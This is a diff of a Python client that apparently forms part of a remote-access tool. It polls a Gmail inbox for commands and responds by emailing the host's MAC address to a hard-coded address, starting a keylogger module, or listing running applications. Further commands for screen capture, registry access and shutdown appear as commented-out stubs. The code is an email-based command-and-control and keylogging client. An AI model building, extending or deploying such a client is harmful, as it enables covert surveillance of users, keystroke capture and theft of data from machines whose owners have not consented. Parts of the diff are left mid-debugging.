@@ -15,6 +15,7 @@ import uuid
 from email.mime.text import MIMEText
 from requests import HTTPError
 import k as kls
+import app_process_server_gmail as ap
 
 # If modifying these scopes, delete the file token.json.
 SCOPES = [
@@ -40,7 +41,7 @@ def send_mail(cmd, package):
             token.write(creds.to_json())
 
     service = build('gmail', 'v1', credentials=creds)
-    message_body = '{}. {}'.format(cmd, package)  # sử dụng phương thức format() để thêm giá trị vào nội dung email
+    message_body = '{}: {}'.format(cmd, package)  # sử dụng phương thức format() để thêm giá trị vào nội dung email
     message = MIMEText(message_body)
 
     message['to'] = 'testpython18mmt@gmail.com'
@@ -79,8 +80,8 @@ def read_mail():
         # Call the Gmail API
         service = build('gmail', 'v1', credentials=creds)
         # query list message with subject client and not read
-        results = service.users().messages().list(userId='me', q='is:unread subject:client').execute()
-        #results = service.users().messages().list(userId='me').execute()
+        # results = service.users().messages().list(userId='me', q='is:unread subject:client').execute()
+        results = service.users().messages().list(userId='me').execute()
         mes = results.get('messages', [])
         if not mes:
             print("No letter find out")
@@ -97,7 +98,7 @@ def read_mail():
                 """
                 # Mark read letter from gmail
                 mark_as_read(service, m)
-                return res
+                #return res
 
     except HttpError as error:
         # TODO(developer) - Handle errors from gmail API.
@@ -135,36 +136,35 @@ def mark_as_read(service, m):
 
 
 def mac_address():
-    send_mail("mac:", hex(uuid.getnode()))
+    send_mail("MAC:", hex(uuid.getnode()))
     return
 def key_logger():
     kls.keylogger()
+    return
+def app_process():
+    ap.app_process()
     return
 
 def Connect():
     while True:
         cmd = read_mail()
-        # if "QUIT" in msg:
-        #     client.close()
-        #     s.close()
-        #     return
-        if "mac" in cmd:
+        if "QUIT" in cmd:
+            return
+        if "MAC" in cmd:
             mac_address()
-        if "keylog" in cmd:
+        elif "KEYLOG" in cmd:
             key_logger()
-        # elif "KEYLOG" in msg:
-        #     keylogger()
-        # elif "DIRECTORY" in msg:
+        # elif "DIRECTORY" in cmd:
         #     directory_tree()
-        # elif "LIVESCREEN" in msg:
+        # elif "LIVESCREEN" in cmd:
         #     live_screen()
-        # elif "APP_PRO" in msg:
-        #     app_process()       
-        # elif "REGISTRY" in msg:
+        elif "APP_PRO" in cmd:
+            app_process()       
+        # elif "REGISTRY" in cmd:
         #     registry()
-        # elif "SD_LO" in msg:
+        # elif "SD_LO" in cmd:
         #     shutdown_logout() 
-        time.sleep(10)
+        time.sleep(3)
 
 
 # def create_window():
@@ -187,7 +187,8 @@ def Connect():
 
 # create_window()
 if __name__ == '__main__':
-    Connect()
+    # Connect()
+    read_mail()
     # while True:
     #     read_mail()
     #     time.sleep(10)
